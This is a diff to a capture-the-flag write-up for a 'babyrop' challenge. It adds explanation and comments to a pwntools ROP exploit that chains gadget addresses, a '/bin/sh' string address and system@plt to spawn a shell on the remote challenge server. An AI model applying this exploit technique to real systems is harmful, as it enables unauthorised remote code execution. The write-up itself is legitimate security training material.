@@ -14,7 +14,7 @@ nc challs1.nusgreyhats.org 5012
 
 ## Description
 
-As seen in the [C file](./files/babyrop.c) below, ...
+As seen in the [C file](./files/babyrop.c) below, our aim is to allocate `*favourite_shell` variable as the register that is used as input for `system` function. We must then force the code to call onto the `system` function after this reallocation of variables/register values. Afterwhich, we can then run a shell within the server's machine to hopefully find and obtain the flag.
 
 ``` c
 // babyrop.c
@@ -36,7 +36,7 @@ int main() {
 }
 ```
 
-With that, we can craft our payload into our [script](./files/baby-code.py). We used the pwn library for python for this.
+With that, we can craft our payload into our [script](./files/baby-code.py). We used the pwn library for python for this. For the determination of values for `PAYLOAD` we used [Ghidra](https://ghidra-sre.org/) and [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) to analyse the assembly instructions and work from ther.
 
 ``` python
 from pwn import *
@@ -46,10 +46,10 @@ PORT = 5012
 BINARY = "./babyrop"
 BABYROP = ELF('./babyrop')
 
-PAYLOAD = p64(0x0000000000400486) * 8 + \
-    p64(0x0000000000400683) + \
-    p64(0x004006a4) + \
-    p64(BABYROP.plt['system'])
+PAYLOAD =  p64(0x0000000000400486) * 8  # RET x 8 (POP)
+PAYLOAD += p64(0x0000000000400683)      # PUSH
+PAYLOAD += p64(0x004006a4)              # address of "/bin/sh"
+PAYLOAD += p64(BABYROP.plt['system'])   # CALL 'system'
 
 r = remote(HOST, PORT)  # server
 # r = process(BINARY)   # local
